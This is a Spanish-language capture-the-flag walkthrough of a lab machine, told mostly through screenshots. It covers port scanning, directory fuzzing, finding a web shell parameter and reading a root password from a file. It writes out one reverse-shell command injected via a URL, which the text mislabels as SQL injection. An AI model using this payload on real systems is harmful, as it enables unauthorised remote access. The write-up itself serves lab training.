Lo primero es hacer un escaneo de puertos y servicios con nmap.

![Pasted image 20240710133744](https://github.com/user-attachments/assets/0682fbde-e40e-45a6-b036-ff6db31ef039)

Accedo al servicio http y lo que encuentro es una web donde aparentemente no encuentro nada útil.

![Pasted image 20240710133806](https://github.com/user-attachments/assets/0ce5a9fb-6230-4eab-98ce-89db5825be1d)

Al final de la página, encuentro el apartado de contacto donde dice que en el apartado /tmp de la máquina hay algo que puede ser interesante.

![Pasted image 20240710134112](https://github.com/user-attachments/assets/383eed6b-9e6a-428a-899b-31d112ed3c48)

Procedo a hacer un poco de fuzzing web con la herramienta gobuster para ver si puedo descubrir algunos directorios que a simple vista se encuentran ocultos.

![Pasted image 20240710134958](https://github.com/user-attachments/assets/c1b77044-6ffd-4cf1-830b-59709d7285cf)

Encuentro el apartado warning.html y shell.php.

Accedo a la dirección warning.html y encuentro el siguiente mensaje.

![Pasted image 20240710140227](https://github.com/user-attachments/assets/377d20f8-a27b-4c91-bee4-228185d04881)

Ahora decido acceder al apartado shel.php.

![Pasted image 20240710134025](https://github.com/user-attachments/assets/83fc3f70-d9f9-45ca-8d11-c4778fe2214b)

Voy a suponer que el apartado shell.php actúa como una consola, por lo que posiblemente pueda inyectar código sql a través de la url.

Para saber qué parámetro necesito para inyectar código, voy a hacer uso de la herramienta wfuzz de la siguiente manera.

![Pasted image 20240710135815](https://github.com/user-attachments/assets/15e48853-d4bf-4b29-8283-ecacee2b1d5c)

La herramienta me ha reportado que el parámetro que necesito es parameter.

Lo primero que hago es ponerme en escucha por el puerto indicado para posteriormente recibir una reverse shell y ganar acceso al sistema.

![Pasted image 20240710140152](https://github.com/user-attachments/assets/23cc038c-5782-46c6-af14-faeecd4f78f6)

Ahora inyecto código a la url de manera que me proporcione una reverse shell a la ip y el puerto indicados.

``` sqli
http://172.17.0.2/shell.php?parameter=bash -c "bash -i >%26 /dev/tcp/172.17.0.2/4343 0>%261"
```

![Pasted image 20240710140212](https://github.com/user-attachments/assets/5c3efb47-7a12-4157-80c8-769174dc5190)

Cuando ejecuto la inyección, gano acceso a un terminal.

Soy el usuario www-data.

Descubro un documento secreto.txt y listo su contenido, obteniendo una supuesta password contraseñaderoot123.

![Pasted image 20240710140412](https://github.com/user-attachments/assets/eb5aeeb1-1e74-4aaf-a622-bfb6b5272d56)

Intento iniciar sesión como root introduciendo la posible password que he obtenido anteriormente.

![Pasted image 20240710140523](https://github.com/user-attachments/assets/3f5e9e32-988c-4957-8cc7-7470ef144d49)
